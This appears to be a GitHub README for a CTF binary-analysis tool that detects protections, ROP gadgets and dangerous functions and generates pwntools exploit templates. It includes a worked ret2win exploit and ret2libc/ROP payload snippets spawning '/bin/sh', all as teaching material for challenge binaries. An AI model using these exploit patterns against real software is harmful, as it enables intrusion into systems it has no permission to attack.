# 🔥 CTF Binary Analyzer v2.0

<div align="center">

![Version](https://img.shields.io/badge/version-2.0-blue.svg)
![Python](https://img.shields.io/badge/python-3.8+-green.svg)
![License](https://img.shields.io/badge/license-MIT-red.svg)

**Advanced Binary Analysis Tool for CTF Reverse Engineering & Pwn Challenges**

*Comprehensive automated analysis with exploit generation*

[Features](#-features) • [Installation](#-installation) • [Usage](#-usage) • [Examples](#-examples)

</div>

---

## 📖 About

CTF Binary Analyzer is a powerful automated tool that analyzes binary files and provides all the necessary information to solve CTF challenges. It uses multiple tools together to perform comprehensive analysis and generate ready-to-use exploit templates.
**Perfect for:**
- 🎯 CTF Competitions (picoCTF, HTB, TryHackMe)
- 🔓 Binary Exploitation
- 🔍 Reverse Engineering
- 🛡️ Security Research
- 📚 Learning Binary Exploitation

---

## ✨ Features

### 🔍 **Comprehensive Analysis**
- ✅ File type & architecture detection (32/64-bit, ELF/PE)
- ✅ Security protection analysis (Canary, NX, PIE, RELRO)
- ✅ String extraction with intelligent categorization
- ✅ Function discovery and disassembly
- ✅ Dangerous function detection
- ✅ Win function highlighting
- ✅ ROP gadget finder
- ✅ PLT/GOT analysis
- ✅ Import/Export analysis
- ✅ Symbol table parsing

### 🚨 **Vulnerability Detection**
- Buffer overflow vectors
- Format string vulnerabilities
- Command injection points
- GOT overwrite possibilities
- Shellcode execution paths
- Stack/heap vulnerabilities

### 💥 **Exploit Generation**
- Automatic pwntools template creation
- Win function addresses included
- ROP gadget suggestions
- 32-bit/64-bit aware payloads
- Exploit chain recommendations
- Ready-to-run Python scripts

### 🎨 **User Experience**
- Color-coded output for easy reading
- Categorized information display
- Clean and organized sections
- Critical info highlighted
- Progress indicators
- Error handling

---

## 📦 Installation

### Prerequisites

**Operating System:**
- Linux (Ubuntu/Debian/Kali recommended)
- macOS (with Homebrew)
- Windows (WSL2)

### Step 1: Clone Repository

```bash
git clone https://github.com/alfazhossain/binaryanalyzer.git
cd ctf-binary-analyzer
chmod +x binary_analyzer.py
```

### Step 2: Install Required Tools

#### On Kali Linux / Parrot OS:
```bash
sudo apt update
sudo apt install -y \
    radare2 \
    binutils \
    file \
    python3 \
    python3-pip
```

#### On Ubuntu / Debian:
```bash
sudo apt update
sudo apt install -y radare2 binutils file python3 python3-pip

# Install radare2 from source (recommended for latest version)
git clone https://github.com/radareorg/radare2
cd radare2
sys/install.sh
```

#### On macOS:
```bash
brew install radare2 binutils python3
```

### Step 3: Install Python Dependencies

```bash
pip3 install pwntools ropgadget
```

### Step 4: Install Optional Tools (Highly Recommended)

#### GDB with pwndbg:
```bash
# Install pwndbg (best GDB plugin for CTF)
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```

#### checksec:
```bash
# Method 1: From package manager
sudo apt install checksec

# Method 2: Manual installation
wget https://github.com/slimm609/checksec.sh/raw/main/checksec
chmod +x checksec
sudo mv checksec /usr/local/bin/
```

#### ROPgadget:
```bash
pip3 install ropgadget
# or
sudo apt install ropgadget
```

#### Additional useful tools:
```bash
sudo apt install -y \
    gdb \
    strace \
    ltrace \
    objdump \
    readelf \
    strings \
    hexdump \
    xxd
```

---

## 🚀 Usage

### Basic Usage

```bash
./binary_analyzer.py <binary_file>
```

### Examples

```bash
# Analyze a 32-bit binary
./binary_analyzer.py pwn1

# Analyze a 64-bit binary
./binary_analyzer.py challenge

# Analyze with Python explicitly
python3 binary_analyzer.py ./vuln_app

# Analyze binary in different directory
./binary_analyzer.py /path/to/binary
```

---

## 📊 Output Sections

Tool টি following sections এ information provide করে:

### 1. 📁 FILE TYPE & BASIC INFO
- File format (ELF, PE)
- Architecture (i386, x86-64)
- Bit size (32/64-bit)
- Endianness
- Link type (static/dynamic)

### 2. 🛡️ SECURITY PROTECTIONS
```
✓ Stack Canary: ENABLED
✗ NX (No Execute): DISABLED (EXPLOITABLE!)
✗ PIE: DISABLED (EXPLOITABLE!)
* RELRO: PARTIAL
```

### 3. 🔍 STRING ANALYSIS
Categorized strings:
- **FLAGS**: flag{...}, CTF{...}
- **FUNCTIONS**: win, shell, admin, secret
- **COMMANDS**: /bin/sh, system, exec
- **FILES**: flag.txt, key.txt
- **SECRETS**: password, key, token

### 4. 📦 IMPORTS & DANGEROUS FUNCTIONS
Highlighted dangerous functions:
- `gets()` - Buffer overflow
- `system()` - Command injection
- `strcpy()` - Buffer overflow
- `printf()` - Format string

### 5. ⚙️ FUNCTION ANALYSIS
- Complete function list
- **★ Highlighted win/vulnerable functions**
- Full disassembly of key functions:
  - main()
  - vulnerable_*()
  - secret_*()
  - win()
  - admin()

### 6. 🔗 ROP GADGETS
Useful gadgets for exploitation:
```
pop rdi; ret
pop rsi; ret
syscall
int 0x80
```

### 7. 🎯 PLT & GOT ANALYSIS
- PLT entries
- GOT addresses
- Function pointers

### 8. 🚨 VULNERABILITY ASSESSMENT
- Identified vulnerabilities
- Exploitation difficulty
- Suggested exploit chain

### 9. 💥 EXPLOIT TEMPLATE
Auto-generated pwntools script:
```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./binary')
p = process('./binary')

payload = b'A' * offset
payload += p64(win_addr)

p.sendline(payload)
p.interactive()
```

### 10. 📊 QUICK SUMMARY
- Binary overview
- Security status
- Win functions count
- Next steps

---

## 🎯 Real Examples

### Example 1: Simple ret2win Challenge

```bash
$ ./binary_analyzer.py pwn1

# Output will show:
# - No security protections
# - 'secret_function' detected at 0x08049192
# - dangerous 'gets()' function
# - Exploit template with address ready
```

**Generated Exploit:**
```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./pwn1')
p = process('./pwn1')

# secret_function found at 0x08049192
win_addr = 0x08049192

payload = b'A' * 76  # Found using cyclic
payload += p32(win_addr)

p.sendline(payload)
p.interactive()
```

### Example 2: 64-bit ROP Challenge

```bash
$ ./binary_analyzer.py rex

# Output will show:
# - NX enabled
# - PIE disabled
# - ROP gadgets: pop rdi, pop rsi
# - system() function available
# - '/bin/sh' string found
```

---

## 🛠️ Tool Dependencies

### Required Tools
| Tool | Purpose | Installation |
|------|---------|--------------|
| **radare2** | Disassembly & analysis | `sudo apt install radare2` |
| **rabin2** | Binary info extraction | Comes with radare2 |
| **r2** | Interactive analysis | Comes with radare2 |
| **file** | File type detection | `sudo apt install file` |
| **strings** | String extraction | Comes with binutils |
| **objdump** | Object file display | `sudo apt install binutils` |
| **nm** | Symbol listing | Comes with binutils |
| **readelf** | ELF file display | Comes with binutils |

### Optional (Recommended) Tools
| Tool | Purpose | Installation |
|------|---------|--------------|
| **checksec** | Security check | `sudo apt install checksec` |
| **ROPgadget** | ROP gadget finder | `pip install ropgadget` |
| **pwntools** | Exploit development | `pip install pwntools` |
| **GDB** | Debugger | `sudo apt install gdb` |
| **pwndbg** | GDB enhancement | [Install guide](https://github.com/pwndbg/pwndbg) |
| **ghidra** | Decompiler | [Download](https://ghidra-sre.org/) |

---

## 📚 Workflow Guide

### Complete CTF Binary Analysis Workflow:

```bash
# Step 1: Initial analysis
./binary_analyzer.py binary_name

# Step 2: Review output
# - Check security protections
# - Note win function addresses
# - Check dangerous functions
# - Review ROP gadgets

# Step 3: Dynamic analysis with GDB
gdb -q ./binary_name
pwndbg> cyclic 200
pwndbg> run
# Paste cyclic pattern
pwndbg> cyclic -l <value>  # Find offset

# Step 4: Modify generated exploit
vim exploit_binary_name.py
# Update offset value
# Add any additional payload

# Step 5: Test exploit
python3 exploit_binary_name.py

# Step 6: Debug if needed
gdb -ex 'break main' -ex 'run' ./binary_name
```

---

## 💡 Tips & Tricks

### Finding Buffer Overflow Offset

```bash
# In pwndbg/GDB:
pwndbg> cyclic 200
pwndbg> run
# Program crashes
pwndbg> cyclic -l 0x61616161  # Use crash value
# Returns: 76 (offset)
```

### Testing Exploit Locally

```python
from pwn import *

# Enable debug output
context.log_level = 'debug'

# Test locally first
p = process('./binary')

# Then try remote
# p = remote('target.com', 1337)
```

### Common Exploitation Techniques

**1. ret2win** - Jump to win function:
```python
payload = b'A' * offset + p64(win_addr)
```

**2. ret2libc** - Call system("/bin/sh"):
```python
payload = b'A' * offset
payload += p64(pop_rdi_gadget)
payload += p64(bin_sh_addr)
payload += p64(system_addr)
```

**3. ROP chain** - Complex chains:
```python
rop = ROP(elf)
rop.call('system', [bin_sh_addr])
payload = b'A' * offset + rop.chain()
```

---

## 🐛 Troubleshooting

### Tool Not Found Errors

```bash
# radare2 not found
sudo apt install radare2

# If still not working, install from source:
git clone https://github.com/radareorg/radare2
cd radare2
sys/install.sh
```

### Permission Denied

```bash
chmod +x binary_analyzer.py
chmod +x binary_file
```

### Python Module Errors

```bash
pip3 install --upgrade pwntools ropgadget
```

### Binary Not Running

```bash
# Check architecture
file binary_name

# For 32-bit on 64-bit system:
sudo dpkg --add-architecture i386
sudo apt update
sudo apt install libc6:i386 libncurses5:i386 libstdc++6:i386
```

---

## 🎓 Learning Resources

### Binary Exploitation
- [pwn.college](https://pwn.college/) - Comprehensive pwn course
- [ROP Emporium](https://ropemporium.com/) - ROP challenges
- [picoCTF](https://picoctf.org/) - Beginner-friendly CTF
- [Nightmare](https://guyinatuxedo.github.io/) - Binary exploitation tutorial

### Tools Documentation
- [Radare2 Book](https://book.rada.re/)
- [pwntools Documentation](https://docs.pwntools.com/)
- [GDB/pwndbg Guide](https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md)

### CTF Platforms
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [CTFtime](https://ctftime.org/)
- [PentesterLab](https://pentesterlab.com/)

---

## 📋 Feature Checklist

- [x] File type detection
- [x] Architecture identification
- [x] Security protection analysis
- [x] String categorization
- [x] Function discovery
- [x] Dangerous function detection
- [x] Win function highlighting
- [x] Function disassembly
- [x] ROP gadget finding
- [x] PLT/GOT analysis
- [x] Vulnerability assessment
- [x] Exploit template generation
- [x] Color-coded output
- [x] Quick summary
- [ ] Heap analysis (coming soon)
- [ ] Format string detector (coming soon)
- [ ] Automatic offset finding (coming soon)
- [ ] Remote exploit mode (coming soon)

---



---

## 📜 License

MIT License - See LICENSE file for details

---

## 👤 Author

**alfazhossain**
- GitHub: [@V01D_SCR1PT](https://github.com/alfazhossain)
- Built for CTF enthusiasts and security researchers

---

## 🙏 Acknowledgments

- radare2 team for amazing reverse engineering framework
- pwntools developers for exploit development library
- CTF community for inspiration and feedback
- All open source tool developers

---

## 📞 Support

Issues? Questions? Suggestions?

- 🐛 Report bugs: [GitHub Issues](https://github.com/alfazhossain/binaryanalyzer/issues)
- 💬 Discussions: [GitHub Discussions](https://github.com/alfazhossain/binaryanalyzer/discussions)
- ⭐ Star the repo if you find it useful!

---

<div align="center">

**Made with ❤️ for the CTF Community**

⭐ Star this repo if it helped you! ⭐

[⬆ Back to Top](#-ctf-binary-analyzer-v20)

</div>
